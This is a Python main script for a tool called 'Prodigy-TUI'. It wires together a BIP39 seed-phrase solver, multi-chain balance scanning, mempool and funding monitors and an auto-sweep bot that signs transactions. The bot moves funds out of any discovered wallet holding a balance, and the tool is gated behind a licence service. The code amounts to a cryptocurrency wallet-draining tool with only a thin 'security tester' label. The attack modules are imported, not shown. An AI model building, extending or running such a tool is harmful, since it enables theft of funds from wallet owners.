import asyncio
import logging
import os
import sys
import threading

from app.implementations.bip39_solver import Bip39Solver
from app.implementations.live_node_client import LiveNodeClient
from app.implementations.bip39_key_store import Bip39KeyStore
from app.implementations.recording_webhook_client import WebhookClient
from app.implementations.transaction_signer import TransactionSigner
from app.implementations.license_verifier import ProductionLicenseVerifier
from app.implementations.telegram_notifier import TelegramNotifier
from app.implementations.license_validator import TelegramLicenseValidator
from app.tester.software_wallet import SoftwareWalletSecurityTester

from app.components.event_bus import EventBus
from app.components.scan_engine import ScanEngine
from app.components.license_service import LicenseService
from app.components.mempool_monitor import MempoolMonitor
from app.components.funding_detector import FundingDetector
from app.components.bitcoin_auto_withdraw_bot import AutoSweepBot
from app.components.config_manager import ConfigManager

from app.storage.sqlite_storage import SqliteStorage
from textual_web import run_textual_ui

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
logger = logging.getLogger(__name__)


def main() -> None:
    logger.info("Starting Prodigy-TUI v2.0")

    config = ConfigManager()
    event_bus = EventBus()
    solver = Bip39Solver()
    key_store = Bip39KeyStore()
    node_client = LiveNodeClient(timeout=15.0)
    webhook_client = WebhookClient(
        target_url=config.get("webhook", "target_url", ""),
        output_dir="events",
    )
    telegram_notifier = TelegramNotifier(
        bot_token=config.get("telegram", "bot_token", ""),
        chat_id=config.get("telegram", "chat_id", ""),
        enabled=config.telegram_enabled,
    )
    signer = TransactionSigner()

    wallet_tester = SoftwareWalletSecurityTester(config=config)

    license_verifier = ProductionLicenseVerifier(
        secret_key=config.get("license", "secret_key", ""),
    )
    telegram_license = TelegramLicenseValidator(
        bot_token=config.get("license", "telegram_bot_token", ""),
        enabled=config.get("license", "enabled", False),
    )

    storage = SqliteStorage()
    storage.initialize()

    scan_engine = ScanEngine(
        solver=solver,
        key_store=key_store,
        node_client=node_client,
        webhook_client=webhook_client,
        event_bus=event_bus,
        config=config,
        chains=["BTC", "ETH", "LTC", "SOL", "BNB", "XRP", "TRON", "POLYGON"],
    )

    license_service = LicenseService(verifier=license_verifier)
    mempool_monitor = MempoolMonitor(node_client=node_client)
    funding_detector = FundingDetector(mempool_monitor=mempool_monitor)
    sweep_bot = AutoSweepBot(
        node_client=node_client,
        key_store=key_store,
        signer=signer,
        event_bus=event_bus,
        config=config,
    )

    # Wire FOUND events → auto-sweep
    async def _on_found(data: dict) -> None:
        pattern = data.get("pattern", "")
        balances = data.get("balances", [])
        if not pattern or not balances:
            return
        for chain_name, bal_amount in balances:
            try:
                proposal = await sweep_bot.evaluate(pattern, chain_name)
                if proposal:
                    logger.info("Auto-sweep triggered for %s on %s (%.8f)", pattern[:20], chain_name, bal_amount)
            except Exception as e:
                logger.debug("Sweep eval failed for %s on %s: %s", pattern[:20], chain_name, e)
    event_bus.subscribe("FOUND", lambda d: asyncio.run(_on_found(d)))

    # Wire funding detection → sweep
    async def _on_funding(data: dict) -> None:
        addr = data.get("address", "")
        chain = data.get("chain", "")
        amount = data.get("amount", 0)
        if addr and amount > 0:
            logger.info("Funding detected on %s: %.8f %s — triggering sweep", addr, amount, chain)
    funding_detector.subscribe(lambda d: asyncio.run(_on_funding(d)))

    if telegram_notifier.enabled:
        logger.info("Telegram notifier enabled")

    mempool_interval = config.get("scan", "mempool_poll_interval", 30)
    for chain in ["BTC", "ETH", "SOL"]:
        t = threading.Thread(
            target=lambda c=chain: asyncio.run(mempool_monitor.watch_chain(c, mempool_interval)),
            daemon=True,
        )
        t.start()

    sweep_interval = config.get("sweep", "check_interval", 30)
    sweep_thread = threading.Thread(
        target=lambda: asyncio.run(sweep_bot.run(sweep_interval)),
        daemon=True,
    )
    sweep_thread.start()

    logger.info("Components initialized")
    logger.info("Starting TUI...")

    auto_start = config.get("api", "auto_start_server", False)
    if auto_start:
        from app.api.gateway import create_app
        import uvicorn
        host = config.get("api", "host", "127.0.0.1")
        port = config.get("api", "port", 8000)
        api_app = asyncio.run(create_app(scan_engine, license_service, event_bus, config=config, node_client=node_client))
        api_thread = threading.Thread(
            target=lambda: uvicorn.run(api_app, host=host, port=port, log_level="info"),
            daemon=True,
        )
        api_thread.start()
        logger.info("API server started on %s:%d", host, port)

    try:
        run_textual_ui(scan_engine, event_bus, config, solver, wallet_tester=wallet_tester)
    finally:
        asyncio.run(node_client.close())


if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    try:
        main()
    except Exception:
        import traceback
        traceback.print_exc()
        input("\nPress Enter to exit...")
        sys.exit(1)
